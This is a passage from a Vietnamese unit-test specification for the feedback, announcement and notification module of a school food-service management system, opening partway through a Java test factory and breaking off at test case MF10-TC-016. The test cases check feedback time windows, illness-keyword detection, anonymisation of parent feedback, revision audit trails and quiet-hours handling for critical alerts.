        a.setTitle("Thông báo thực đơn tuần 27 (29/06–03/07)");
        a.setContent("Kính gửi Quý phụ huynh, …");
        a.setAudienceCodesJson("[\"PARENT_ALL\"]");            // C9/L12 — mã để LỌC
        a.setAudienceLabel("Phụ huynh toàn trường");           //          nhãn để HIỂN THỊ
        a.setStatus(AnnouncementStatus.PUBLISHED);
        a.setUrgent(false);
        a.setAuthorUserId(UUID.randomUUID());                  // D9 — business field, KHÁC created_by (L16)
        a.setAuthorName("Phạm Quốc Toản (BGH)");
        a.setPublishedAt(Instant.parse("2026-06-27T02:00:00Z"));
        overrides.accept(a);
        return a;
    }

    /** Lệnh phát thông báo — mặc định là loại KHÔNG critical. */
    public static NotificationCommand aNotifyCommand(Consumer<NotificationCommandBuilder> overrides) {
        var b = NotificationCommand.builder()
            .schoolId("SCH-HN-0042")
            .recipientRoles(List.of("medical-staff", "school-admin"))  // D6 kebab-case (L3/H6)
            .type(NotificationType.MENU_PUBLISHED)                     // D6 — 1 trong 7 (L2/H5)
            .title("Thực đơn tuần 28 chờ phê duyệt")
            .content("…")
            .link("/school-admin/menus");                              // chỉ path nội bộ (§4.3)
        overrides.accept(b);
        return b.build();
    }

    /** JWT actor — FX-017…FX-019. */
    public static AuthUser anActor(String userCode, String role, String schoolCode) {
        return new AuthUser(userCode, role, schoolCode, "Test Actor");
    }
}
```

```java
// ❌ SAI — shared mutable state (AP-AI-002): feedback bị test trước mutate sang deleted
// private final Feedback feedback = FeedbackTestFactory.aFeedback(f -> {});

// ✅ ĐÚNG — fresh instance trong từng @Test
// var feedback = FeedbackTestFactory.aFeedback(f -> f.setRating(2));
```

---

### UNIT TEST CASES

---

### MF10-TC-001 — Cửa sổ phản hồi 24 giờ tính từ `servedAt` (BR-139)

**Severity:** `CRITICAL`
**Feature Under Test:** `FeedbackWindowPolicy.assertOpen()` · `FeedbackService.submit()`
**Test File:** `src/test/java/com/sfms/mf10/domain/FeedbackWindowPolicyTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-001`
**Oracle Source:** **BR-139** — *"Phụ huynh và giáo viên chỉ có thể nộp phản hồi về bữa ăn trong vòng **24 giờ** kể từ khi bữa ăn **được phục vụ**"* · **MSG-022** *"Feedback submission blocked: Outside the 24-hour limit of meal serving."* · **UC-085 AF2** · mã `FBA-022` (TDS §10) · **ADR-M10-1** (tính runtime từ `servedAt`, không lưu cờ)

**Preconditions:** `Clock` = `FX-001`; `ReferenceResolver` = `FX-002` (🔴 `M10-D06` — không còn `MealServingPort`).

**Test Steps (Boundary Value Analysis):**
1. Arrange: `var req = FeedbackTestFactory.aSubmitRequest(r -> r.setMealSessionId(...));`
2. Act: `service.submit(req, actorParent)`
3. Assert theo bảng — `servedAt` do stub trả, `now` = `FX-001` (`2026-07-01T14:00:00Z`):

| `servedAt` (stub) | Khoảng cách tới `now` | Kỳ vọng |
|---|---|---|
| `2026-06-30T14:00:01Z` | 23h59m59s | ✅ hợp lệ |
| `2026-06-30T14:00:00Z` | **đúng 24h00m00s** | ✅ hợp lệ — **biên đóng** (`now ≤ servedAt + 24h`) |
| `2026-06-30T13:59:59Z` | 24h00m01s | ❌ `FeedbackWindowClosedException` code **`FBA-022`** |
| `2026-06-30T03:50:00Z` (`MS-20260630-L`) | ~34h | ❌ `FBA-022` |
| `Optional.empty()` (`MS-9999`) | — | ❌ `FBA-404` — phiên ăn không tồn tại, **không** phải `FBA-022` |
| `2026-07-01T15:00:00Z` (tương lai) | −1h | ❌ `FBA-REQ` — không phản hồi bữa **chưa phục vụ** |

**Expected Result (PASS — hành vi đúng):**
- 2 case ✅ đi tiếp tới cổng BR-140; `verify(mealServingPort).findServedAt(...)` được gọi **đúng 1 lần**
- 4 case ❌ ném đúng exception, `verify(repository, never()).save(any())`

**Expected Result (FAIL — dấu hiệu lỗi):**
- Nếu policy đọc `req.getMealDate()` thay vì `servedAt`: phụ huynh sửa 1 field trong payload là mở lại cửa sổ vô hạn — đúng lỗ hổng `review.md` H4 mô tả (*"BR-139 hiện không tính được ở server"*).
- Nếu `Optional.empty()` cũng trả `FBA-022`: người dùng thấy "quá 24 giờ" trong khi thật ra phiên ăn không tồn tại → báo sai nguyên nhân.

**Current Status:** 🔴 Not written
**Implementation Note:** `FeedbackWindowPolicy` là **nơi duy nhất** biết luật BR-139; `submit()`, `update()`, `retract()` đều gọi nó (C3). Không rải `plusHours(24)` ra 3 chỗ.

---

### MF10-TC-002 — BR-139 áp cho cả sửa và xóa, không chỉ gửi mới (UC-046 AF1/AF2)

**Severity:** `CRITICAL`
**Feature Under Test:** `FeedbackService.update()` · `FeedbackService.retract()`
**Test File:** `.../service/FeedbackManageTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-002`
**Oracle Source:** **UC-046 AF1** (*"if the feedback is within the 24-hour window … Parent clicks 'Edit'"*), **AF2** (*"if within the 24-hour window, Parent clicks 'Delete'"*), **EX1** — *"the system disables the 'Edit' and 'Delete' buttons and displays **MSG-022** if an edit is attempted **via API**"* · **BR-139**

**Preconditions:** `FX-003` (`FB-8812`, phiên còn trong cửa sổ), `FX-004` (`FB-8809`, phiên đã quá 24h); actor = `FX-017`.

**Test Steps:**
1. `update("FB-8812", {rating:4}, parent)` → ✅ lưu, `updatedAt != null`
2. `retract("FB-8812", parent)` → ✅ `deletedAt != null`
3. `update("FB-8809", {rating:4}, parent)` → ❌ `FBA-022`
4. `retract("FB-8809", parent)` → ❌ `FBA-022`

**Expected Result (PASS):** 2 case đầu đi qua, 2 case sau ném `FeedbackWindowClosedException("FBA-022")` và **không** ghi DB.
**Expected Result (FAIL):** Chỉ chặn ở `POST` → phụ huynh sửa nội dung phản hồi sau khi nhà trường đã tổng hợp vào báo cáo tuần (BR-141) và sau khi Y tế đã mở điều tra theo từ khóa bệnh lý (BR-142) — dữ liệu điều tra đổi dưới chân người đang điều tra. UC-046 EX1 nêu đích danh đường tấn công này (*"via API"*), nên đây **không** phải rủi ro lý thuyết.

**Current Status:** 🔴 Not written
**Implementation Note:** FE hiện **không có** nút Edit/Delete (H10) — test này chứng minh gate nằm ở server, độc lập việc Minh đã làm màn hay chưa.

---

### MF10-TC-003 — Dưới 3 sao bắt buộc tag quan ngại chất lượng (BR-140)

**Severity:** `HIGH`
**Feature Under Test:** `QualityTagRule` · `FeedbackService.submit()/update()`
**Test File:** `.../domain/QualityTagRuleTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-003`
**Oracle Source:** **BR-140** — *"Khi phụ huynh đánh giá **dưới 3 sao**, hệ thống **bắt buộc** nhắc chọn **tag quan tâm chất lượng** từ danh sách có sẵn"* · **UC-085** Normal Flow bước 3 · mã `FBA-140` (TDS §10)

**Test Steps (Boundary Value Analysis — `submitterRole = PARENT`):**

| `rating` | `tags` | Kỳ vọng |
|---|---|---|
| `1` | `[]` | ❌ `FBA-140` |
| `2` | `[]` | ❌ `FBA-140` — **biên trên của vùng cấm** |
| `2` | `["Món ăn nguội"]` | ✅ hợp lệ |
| `3` | `[]` | ✅ hợp lệ — **biên dưới của vùng cho phép** (BR-140 nói *"dưới 3"*, không phải *"từ 3 trở xuống"*) |
| `5` | `[]` | ✅ hợp lệ |
| `0` / `6` | bất kỳ | ❌ `FBA-REQ` — ngoài thang 1–5 (`ck_fb_rating`) |
| `2` | `["  "]` (chuỗi trắng) | ❌ `FBA-140` — tag trắng **không tính là tag** |

**Expected Result (PASS):** đúng 4 case ✅ / 4 case ❌ như bảng; case ❌ **không** `save()`.
**Expected Result (FAIL):** `rating=3, tags=[]` bị chặn → hiểu sai BR-140 thành "≤3", làm phụ huynh chấm 3 sao (mức trung tính) bị buộc nêu quan ngại — sai nghiệp vụ theo hướng ngược lại, và mock FE (`needConcern = rating > 0 && rating < 3`) sẽ không khớp backend.

**Current Status:** 🔴 Not written
**Implementation Note:** Kiểm ở service để trả đúng `FBA-140`, **bắt buộc** giữ CHECK `ck_fb_low_rating_needs_tag` ở DB (TDS §5.2 / C4) — service bị bỏ qua khi gọi API trực tiếp hoặc khi seed sai.

---

### MF10-TC-004 — BR-140 KHÔNG áp cho phản hồi của Giáo viên (CF-M10-3)

**Severity:** `MEDIUM`
**Feature Under Test:** `QualityTagRule`
**Test File:** `.../domain/QualityTagRuleTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-004`
**Oracle Source:** **traceability §1.10** — UC-086 (Submit Meal Feedback, **Teacher**) có cột Business Rules **chỉ `BR-139`**, không có BR-140 · **BR-140** nguyên văn giới hạn chủ thể: *"Khi **phụ huynh** đánh giá dưới 3 sao…"* · TDS **CF-M10-3** (UC file liệt kê rộng hơn traceability → theo traceability)

**Test Steps:**
1. `submit(rating=2, tags=[], submitterRole=TEACHER, scope=CLASS)` → ✅ **hợp lệ**
2. `submit(rating=2, tags=[], submitterRole=PARENT)` → ❌ `FBA-140` *(đối chứng — chứng minh luật vẫn sống, không bị tắt nhầm cho cả hai)*

**Expected Result (PASS):** Teacher qua, Parent bị chặn — trong **cùng một test**, để không ai "sửa cho nhất quán" một chiều.
**Expected Result (FAIL):** Nếu ép Teacher chọn tag: trái traceability §1.10 (nguồn chuẩn) và chặn luồng UC-086 vốn hỏi về **khẩu phần** (`portionSize`) chứ không về tag chất lượng.

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ Đây là test **dễ bị sửa nhầm** nhất của module. Ghi comment trỏ CF-M10-3 ngay trong file test; nếu Huy chốt lại rằng UC-086 cũng chịu BR-140 thì sửa **traceability trước**, rồi mới sửa test.

---

### MF10-TC-005 — Dò từ khóa bệnh lý từ bảng cấu hình, không dấu và không phân biệt hoa/thường (BR-142)

**Severity:** `CRITICAL`
**Feature Under Test:** `IllnessKeywordDetector.detect()`
**Test File:** `.../domain/IllnessKeywordDetectorTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-005`
**Oracle Source:** **BR-142** — *"Hệ thống **tự động phân tích** nội dung phản hồi của phụ huynh, phát hiện **từ khóa liên quan đến bệnh tật** (ví dụ: 'đau bụng', 'nôn mửa')"* · **ADR-M10-6** (bảng `illness_keywords`, `unaccent` + `lower`) · `FX-011` (10 từ khóa nguyên văn `mock-data.ts:2716`)

**Test Steps (Equivalence Partitioning):**

| `comment` | Kỳ vọng | Lớp |
|---|---|---|
| `"Con về kêu đau bụng nhẹ buổi chiều."` | `true`, matched=`["đau bụng"]` | khớp nguyên dạng |
| `"be bi NON sau khi an"` | `true`, matched=`["nôn"]` | **không dấu + HOA** |
| `"Cháu bị Tiêu Chảy từ tối qua"` | `true` | hoa/thường lẫn lộn |
| `"Con ăn hết suất, khen ngon."` | `false` | không khớp |
| `""` / `null` | `false` | rỗng — **không** NPE |
| `"món có sốt cà chua"` | `false` ⚠️ | **bẫy:** `"sốt"` là từ khóa nhưng `"sốt cà chua"` không phải triệu chứng |

**Expected Result (PASS):** 3 case `true`, 3 case `false`; detector đọc từ `IllnessKeywordRepository.findByActiveTrue()` — `verify(repo).findByActiveTrue()`, **không** có mảng hằng trong class.
**Expected Result (FAIL):** Hardcode danh sách trong Java → Y tế không bổ sung được từ khóa mới ("phát ban", "chóng mặt") mà không deploy lại; vi phạm ADR-M10-6 và anti-pattern **AP-AI-012**.

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ Case cuối (`"sốt cà chua"`) là **quyết định nghiệp vụ chưa có nguồn** — BR-142 không nói gì về ngữ cảnh từ khóa. Test này ghi kỳ vọng `false` **kèm dấu ⚠️** và mục **F6** (§8.1) hỏi Huy/Y tế: chấp nhận dương tính giả (an toàn hơn, đúng tinh thần cảnh báo y tế) hay lọc theo ngữ cảnh? **Nếu chưa có quyết định, để `@Disabled` riêng case này** — không tự chọn.

---

### MF10-TC-006 — Backend tính lại `illnessKeyword`, bỏ qua giá trị client gửi (L9 / review §H3)

**Severity:** `CRITICAL`
**CWE:** `CWE-602 — Client-Side Enforcement of Server-Side Security`
**Feature Under Test:** `FeedbackService.submit()`
**Test File:** `.../service/FeedbackSubmitTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-006`
**Oracle Source:** **BR-142** (*"**Hệ thống** tự động phân tích"* — chủ thể là hệ thống, không phải client) · `review.md` **H3** = **blocker**: *"Client tự quyết định 'có dấu hiệu bệnh lý hay không' — **sửa payload là tắt được cảnh báo y tế**. Backend phải tính lại, bỏ qua giá trị client gửi"* · `review_fix_plan.md` H3

**Test Steps (Error Guessing):**
1. `submit({comment:"con đau bụng", illnessKeyword:**false**})` → assert bản ghi lưu **`illnessKeyword=true`** và `NotificationPort.publish()` được gọi với `type=ALLERGY_ALERT`
2. `submit({comment:"con ăn ngon", illnessKeyword:**true**})` → assert lưu **`false`**, **không** phát cảnh báo y tế
3. `submit({comment:"con đau bụng"})` (không có field) → `true`
4. Assert DTO request **không có** setter public cho `illnessKeyword`, hoặc field bị `@JsonIgnore` — kiểm bằng ánh xạ Jackson

**Expected Result (PASS):** Giá trị client gửi **không ảnh hưởng** kết quả ở cả 2 chiều (tắt nhầm **và** bật nhầm).
**Expected Result (FAIL):** Chiều 1 lọt → phụ huynh (hoặc kẻ gọi API) tắt được cảnh báo ngộ độc tập thể; chiều 2 lọt → Y tế bị spam cảnh báo giả, mất niềm tin vào kênh cảnh báo, dần bỏ qua cả cảnh báo thật.

**Current Status:** 🔴 Not written
**Implementation Note:** Mock FE đang làm **cả hai việc sai**: tính ở client (`hasIllnessKeyword()`) **và** tự gọi `notify()` tới `["medical-staff","school-admin"]` (`feedback/meal/page.tsx:98-111`). Cả hai chuyển hẳn về server (`review_fix_plan.md` T3.3 dòng 187). Test **không** chờ FE sửa.

---

### MF10-TC-007 — Hai nhánh cảnh báo độc lập: MSG-057 (<3 sao) và MSG-058 (từ khóa bệnh lý)

**Severity:** `HIGH`
**Feature Under Test:** `FeedbackService.submit()` → `NotificationPort.publish()`
**Test File:** `.../service/FeedbackSubmitTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-007`
**Oracle Source:** **traceability §1.10** UC-085 → **MSG-057, MSG-058** · **MSG-057** *"Negative meal feedback rating (<3 stars) received from parent."* (BR-140) · **MSG-058** *"Illness keywords detected in parent feedback. Potential incident flag."* (BR-142) · **BR-142** (*"thông báo ngay cho **Medical Staff**"*) · TDS **CF-M10-9** (mock **chưa** phát MSG-057)

**Test Steps (Decision Table — 4 tổ hợp):**

| `rating` | có từ khóa? | Notification kỳ vọng |
|---|---|---|
| `5` | không | **1** — `FeedbackSubmitted` tới `service-caterers` (loại thường) |
| `2` | không | **2** — thêm **MSG-057** tới `["service-caterers","school-admin"]` |
| `5` | có | **2** — thêm **MSG-058** `ALLERGY_ALERT`, `critical`, tới `["medical-staff","school-admin"]` |
| `2` | có | **3** — cả MSG-057 **và** MSG-058 |

**Expected Result (PASS):** Số lần `publish()` đúng bảng; MSG-058 mang `type=ALLERGY_ALERT` (D6 — L2) và tới **`medical-staff`** (kebab-case — L3).
**Expected Result (FAIL):** Gộp hai nhánh thành một `if/else` → phản hồi 2 sao **có** từ khóa bệnh lý chỉ báo caterer mà **không** báo Y tế (hoặc ngược lại). Đây là ô nguy hiểm nhất của bảng vì nó đúng lúc cần cả hai bên vào cuộc.

**Current Status:** 🔴 Not written
**Implementation Note:** Mock chỉ có nhánh từ khóa; MSG-057 là phần **backend làm thêm** (CF-M10-9) — cần Minh bổ sung hiển thị phía caterer khi cắt.

---

### MF10-TC-008 — DTO danh sách/tổng hợp không mang danh tính người gửi (BR-145)

**Severity:** `CRITICAL`
**CWE:** `CWE-359 — Exposure of Private Personal Information`
**Legal:** **PDPD** — dữ liệu sức khỏe trẻ em
**Feature Under Test:** `FeedbackListItemMapper` (MapStruct) ↔ `FeedbackDetailMapper`
**Test File:** `.../mapper/FeedbackAnonymizationTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-008`
**Oracle Source:** **BR-145** — *"Dữ liệu phản hồi được **tổng hợp ẩn danh** vào dashboard của trường"* · **UC-162** Normal Flow bước 3 — *"System displays the meal feedback details … **while hiding the identity of the submitter** to protect privacy"* · **ADR-M10-5** · `review_fix_plan.md` **H2**: *"**FE vi phạm quyền riêng tư**, TDS đúng"*

**Test Steps (Negative/Absence Testing — bắt buộc có tiền đề khẳng định):**
1. **Tiền đề:** `var entity = aFeedback(f -> { f.setStudentId(STUDENT); f.setStudentName("Nguyễn Minh Khang"); });` → assert `entity.getStudentId() != null` ⭐ *(nếu bỏ bước này, test xanh giả khi mapper chưa tồn tại)*
2. `var item = listItemMapper.toDto(entity);` → assert **có** `className`, `mealDate`, `rating`, `tags`, `comment`, `illnessKeyword`
3. Assert **không có**: serialize `item` ra JSON, kiểm `!json.has("studentId") && !json.has("student") && !json.has("submitterName") && !json.has("submitterUserId")`
4. `var detail = detailMapper.toOwnerDto(entity);` → assert **có** `studentId` (chủ sở hữu vẫn thấy con mình)

**Expected Result (PASS):** Hai mapper cho hai kết quả khác nhau từ **cùng một entity**; bản ẩn danh mất đúng 4 field trên và **giữ nguyên** phần nghiệp vụ.
**Expected Result (FAIL):** Trả nguyên entity cho BGH/caterer → lộ tên học sinh gắn với nội dung sức khỏe cho ~26 tài khoản caterer + 8 tài khoản BGH mỗi trường. Đây là mục **DPO Sign-off** của tài liệu này.

**Current Status:** 🔴 Not written
**Implementation Note:** Assert trên **JSON đã serialize**, không phải trên object — field `null` vẫn có thể lộ tên field ra hợp đồng và bị FE dựa vào.

---

### MF10-TC-009 — Ngoại lệ BR-142: Medical Staff xem danh tính chỉ khi có từ khóa bệnh lý, và phải ghi audit

**Severity:** `HIGH`
**CWE:** `CWE-863 — Incorrect Authorization`
**Feature Under Test:** `FeedbackService.getDetail()`
**Test File:** `.../service/FeedbackIdentityAccessTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-009`
**Oracle Source:** **BR-142** (*"thông báo ngay cho **Medical Staff** để xem xét"* — không xem xét được trên dữ liệu ẩn danh) · **BR-145** (mặc định ẩn danh) · **ADR-M10-5** *"Ngoại lệ có kiểm soát"* · **BR-162** (audit bất biến)

**Test Steps (Decision Table):**

| Actor | `illnessKeyword` | Kỳ vọng |
|---|---|---|
| `medical-staff` | `true` (`FX-004`) | ✅ thấy `studentId` + `studentName` · **có** audit `READ FeedbackIdentity` |
| `medical-staff` | `false` (`FX-003`) | ❌ ẩn danh — **không** ngoại lệ |
| `school-admin` | `true` | ❌ ẩn danh (ngoại lệ **chỉ** cho Y tế) |
| `service-caterers` | `true` | ❌ ẩn danh |
| chủ sở hữu (`FX-017`) | bất kỳ | ✅ đầy đủ (là con mình, không phải ngoại lệ) |

**Expected Result (PASS):** Đúng 2 ô ✅; ô Y tế + `true` sinh **đúng 1** bản ghi audit kèm `feedbackId` và `userId`.
**Expected Result (FAIL):** Mở ngoại lệ cho mọi bản ghi → Y tế duyệt danh sách là đọc được tên toàn bộ học sinh có phản hồi, kể cả phản hồi khen món ăn. Không ghi audit → không truy được ai đã xem PII khi có khiếu nại.

**Current Status:** 🔴 Not written
**Implementation Note:** Ngoại lệ đặt ở **service**, không ở controller — controller không biết `illnessKeyword` trước khi đọc bản ghi (tránh **AP-AI-004** Layer Violation).

---

### MF10-TC-010 — Mỗi lần tạo/cập nhật thông báo đều sinh một mục lịch sử sửa đổi (BR-144)

**Severity:** `HIGH`
**Feature Under Test:** `AnnouncementService.create()/update()`
**Test File:** `.../service/AnnouncementRevisionTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-010`
**Oracle Source:** **BR-144** — *"Mỗi lần cập nhật thông báo (Announcement) phải tạo một **mục lịch sử sửa đổi** kèm timestamp và ID người thực hiện"* · **UC-089** Normal Flow bước 5 · handler mock `mock-server.ts:171-175` (note mặc định `"Cập nhật nội dung"`) và `:153-155` (`"Công bố lần đầu"`)

**Test Steps:**
1. `create(cmd)` → assert `revisions.size() == 1`, `note == "Công bố lần đầu"` *(khớp mock — hợp đồng hiển thị)*
2. `update(code, cmd với revisionNote="Bổ sung bữa phụ thứ Năm")` → `size == 2`, mục cuối đúng note
3. `update(code, cmd **không** có `revisionNote`)` → `size == 3`, note mặc định `"Cập nhật nội dung"` *(khớp mock)*
4. `update(code, cmd chỉ đổi `status` DRAFT→PUBLISHED)` → `size == 4` — **đổi trạng thái cũng là một lần cập nhật**

**Expected Result (PASS):** 4 bước tăng đúng 1 mỗi lần; không lần nào ghi đè mục cũ.
**Expected Result (FAIL):** Bước 4 không sinh revision → thời điểm công bố (mốc pháp lý quan trọng nhất với phụ huynh) không có vết. Mock hiện dùng `Object.assign(row, fields)` rồi mới push revision — dễ dẫn tới hiểu nhầm rằng chỉ "sửa nội dung" mới tính.

**Current Status:** 🔴 Not written

---

### MF10-TC-011 — Revision ghi đúng ID người thực hiện và timestamp do server đặt (BR-144)

**Severity:** `HIGH`
**Feature Under Test:** `AnnouncementService.update()`
**Test File:** `.../service/AnnouncementRevisionTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-010`
**Oracle Source:** **BR-144** (*"kèm **timestamp** và **ID người thực hiện**"*) · **C2** (danh tính từ JWT, không tin body) · **D4** (thời gian ISO, do server)

**Test Steps (Error Guessing):**
1. `update(code, {editor:"Người khác", revisedAt:"2020-01-01T00:00:00Z", …}, actor=FX-018 school-admin)`
2. Assert `revision.revisedByUserId == actor.userId` — **không** phải giá trị `editor` trong body
3. Assert `revision.revisedByName == actor.fullName`
4. Assert `revision.revisedAt == FX-001` (clock server), **không** phải `2020-01-01`

**Expected Result (PASS):** Cả 3 field lấy từ JWT + clock; giá trị client gửi bị bỏ qua.
**Expected Result (FAIL):** Mock lấy `editor` từ body (`mock-server.ts:173`, mặc định `"Phạm Quốc Toản (BGH)"`) — bê nguyên sang backend thì lịch sử sửa đổi ghi được **tên bất kỳ**, tức là làm giả được vết BR-144. Với tài liệu gửi hàng nghìn phụ huynh, đây là chỗ cần chống chối bỏ nhất.

**Current Status:** 🔴 Not written

---

### MF10-TC-012 — Máy trạng thái Announcement: cấm quay về nháp sau khi đã công bố

**Severity:** `HIGH`
**Feature Under Test:** `AnnouncementStatus` transition guard · `AnnouncementService.update()`
**Test File:** `.../domain/AnnouncementStatusTransitionTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-011`
**Oracle Source:** **TDS §6.5 Invariant** — *"`PUBLISHED → DRAFT` bị **cấm** — thông báo đã tới tay phụ huynh thì không 'rút về nháp' được (muốn gỡ thì đăng thông báo đính chính, giữ vết BR-144)"* · mã `FBA-STATE` (TDS §10) · **BR-144**

**Test Steps (State Transition Testing):**

| Từ | Tới | Kỳ vọng |
|---|---|---|
| *(mới)* | `DRAFT` | ✅ `publishedAt = null` |
| *(mới)* | `PUBLISHED` | ✅ `publishedAt = now()` (MSG-047) |
| `DRAFT` | `PUBLISHED` | ✅ `publishedAt = now()`, phát thông báo |
| `DRAFT` | `DRAFT` | ✅ sửa nội dung, `publishedAt` vẫn `null` |
| `PUBLISHED` | `PUBLISHED` | ✅ sửa nội dung, **`publishedAt` KHÔNG đổi** (mốc công bố gốc) |
| **`PUBLISHED`** | **`DRAFT`** | ❌ **409 `FBA-STATE`** |

**Expected Result (PASS):** 5 transition hợp lệ, 1 bị chặn; ô `PUBLISHED→PUBLISHED` giữ nguyên `publishedAt` cũ.
**Expected Result (FAIL):** Nếu `PUBLISHED→PUBLISHED` cập nhật lại `publishedAt` → mốc công bố trôi theo mỗi lần sửa chính tả, phụ huynh nhận thông báo hôm 27/06 nhưng hệ thống ghi 02/08. Đây là lỗi **âm thầm**: không exception, không log, chỉ sai dữ liệu.

**Current Status:** 🔴 Not written
**Implementation Note:** Không có API xóa announcement (TDS §6.5) — đừng thêm `DELETE` "cho tiện".

---

### MF10-TC-013 — Thông báo nháp có `publishedAt = null`, không phải chuỗi rỗng (L14 / review §H8)

**Severity:** `MEDIUM`
**Feature Under Test:** `AnnouncementMapper` · `ck_ann_published_at`
**Test File:** `.../mapper/AnnouncementMapperTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-012`
**Oracle Source:** **UC-017** Normal Flow bước 2 (*"Publication Type defaulted to 'Draft'"*) · `review.md` **H8** — *"`mock-server.ts:148` sinh `todayStamp()`; DRAFT → **chuỗi rỗng `""`** chứ không `null` … nên thống nhất `null`"* · **D4** (ISO hoặc null, không có kiểu thứ ba) · TDS §5.2 `ck_ann_published_at`

**Test Steps:**
1. `create({status:"DRAFT"})` → JSON `"publishedAt": null` — assert `json.get("publishedAt").isNull()`, **không phải** `""`
2. `create({status:"PUBLISHED"})` → `publishedAt` khớp regex ISO-8601, và **không** khớp `\d{2}/\d{2}/\d{4}`
3. Thử `save(status=DRAFT, publishedAt=now())` thẳng repository → vi phạm `ck_ann_published_at`
4. Thử `save(status=PUBLISHED, publishedAt=null)` → vi phạm cùng constraint

**Expected Result (PASS):** 2 nhánh JSON đúng kiểu; 2 nhánh DB bị chặn ở tầng constraint.
**Expected Result (FAIL):** Trả `""` → FE kiểm `publishedAt` truthy vẫn chạy (H8 nói vậy) nhưng `formatVnDateTime("")` sẽ ném hoặc hiện `Invalid Date` khi Minh thêm `lib/format.ts` (T3.2). Lỗi lộ ra **sau** khi cắt sang backend, khó lần ngược.

**Current Status:** 🔴 Not written

---

### MF10-TC-014 — Cảnh báo khẩn phát ngay: bỏ qua giờ yên tĩnh và bỏ qua cờ tắt của người dùng (BR-138)

**Severity:** `CRITICAL`
**Feature Under Test:** `NotificationDispatcher.dispatch()`
**Test File:** `.../notification/NotificationDispatcherTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-013`
**Oracle Source:** **BR-138** — *"Các cảnh báo **quan trọng về an toàn thực phẩm** (ví dụ: thu hồi thực phẩm) được **phát ngay lập tức** đến tất cả người dùng liên quan **mà không cần qua quy trình phê duyệt** của quản trị viên"* · **BR-158** — *"Cảnh báo khẩn cấp **không bị ảnh hưởng** bởi giờ yên tĩnh"* · mock `notification-settings/page.tsx` (3 loại gắn nhãn **CRITICAL — luôn gửi**) · **D6** (`INCIDENT_ALERT`, `FOOD_RECALL`, `ALLERGY_ALERT`)

**Test Steps (Decision Table — clock đặt **23:30 giờ VN**, trong quiet hours):**

| `type` | `typeEnabled[type]` | Kỳ vọng |
|---|---|---|
| `FOOD_RECALL` | `false` (người dùng đã tắt) | ✅ **SENT ngay** — critical thắng cả quiet hours lẫn cờ tắt |
| `INCIDENT_ALERT` | `false` | ✅ **SENT ngay** |
| `ALLERGY_ALERT` | `true` | ✅ **SENT ngay** |
| `MENU_PUBLISHED` | `true` | ⏸️ **DEFERRED** tới `quietEnd` |
| `EXPIRY_ALERT` | `false` | ⛔ **bỏ qua gửi** — nhưng **vẫn lưu** bản ghi để xem trong chuông (UC-136) |

**Expected Result (PASS):** 3 loại critical đi thẳng `PushGateway`; `MENU_PUBLISHED` sinh `NotificationDelivery(status=DEFERRED)`; `EXPIRY_ALERT` **không** gọi gateway nhưng `notificationRepository.save()` vẫn được gọi.
**Expected Result (FAIL):** Nếu critical bị quiet hours chặn: thông báo **thu hồi thực phẩm** lúc 23:30 nằm chờ tới 06:00 — bữa sáng hôm sau đã dùng lô thu hồi. BR-138 sinh ra chính xác để chặn kịch bản này.

**Current Status:** 🔴 Not written
**Implementation Note:** `critical` **dẫn xuất** từ `type ∈ {INCIDENT_ALERT, FOOD_RECALL, ALLERGY_ALERT}` (hệ quả của L2) — **không** lấy từ body request, nếu không người gọi tự phong critical để vượt quiet hours.

---

### MF10-TC-015 — Giờ yên tĩnh mặc định 22:00–06:00 hoãn thông báo thường (BR-158)

**Severity:** `HIGH`
**Feature Under Test:** `QuietHoursPolicy.shouldDefer()`
**Test File:** `.../domain/QuietHoursPolicyTest.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-014`
**Oracle Source:** **BR-158** — *"Mặc định, hệ thống **không gửi thông báo push không khẩn cấp** trong khoảng thời gian **22:00 – 06:00**"* · `notification_preferences.quiet_start/quiet_end` mặc định `22:00`/`06:00` (TDS §5.2)

**Test Steps (Boundary Value Analysis — giờ **địa phương** `Asia/Ho_Chi_Minh`, `critical=false`):**

| Giờ VN | Kỳ vọng | Ghi chú |
|---|---|---|
| `21:59:59` | ✅ gửi | biên trước |
| `22:00:00` | ⏸️ hoãn | **biên vào** (đóng) |
| `23:30:00` | ⏸️ hoãn | giữa vùng, **sau nửa đêm chưa tới** |
| `00:30:00` | ⏸️ hoãn | ⭐ **vắt qua nửa đêm** — `start > end` |
| `05:59:59` | ⏸️ hoãn | biên ra |
| `06:00:00` | ✅ gửi | **biên ra** (mở) |
| `12:00:00` | ✅ gửi | ngoài vùng |

**Expected Result (PASS):** Đúng 4 ô hoãn / 3 ô gửi; `nextRetryAt` của ô hoãn = **06:00 hôm sau** nếu đang là 23:30, và **06:00 cùng ngày** nếu đang là 00:30.
**Expected Result (FAIL):** Cài đặt kiểu `now.isAfter(start) && now.isBefore(end)` sẽ cho `00:30` là **ngoài** quiet hours (vì `00:30 < 22:00`) → **toàn bộ khoảng nửa đêm–06:00 mất tác dụng**, đúng nửa khoảng mà BR-158 muốn bảo vệ. Đây là lỗi biên phổ biến nhất khi khoảng thời gian vắt qua nửa đêm; test `00:30` là ô **bắt buộc**, không được bỏ.

**Current Status:** 🔴 Not written
**Implementation Note:** So sánh phải là `now >= start || now <= end` khi `start > end`. Dùng `LocalTime` theo `SCHOOL_ZONE`, **không** so trên `Instant` UTC (lệch 7 giờ = lệch nguyên vùng).

---

### MF10-TC-016 — Giờ yên tĩnh cá nhân hóa ghi đè mặc định (BR-158b)

**Severity:** `MEDIUM`
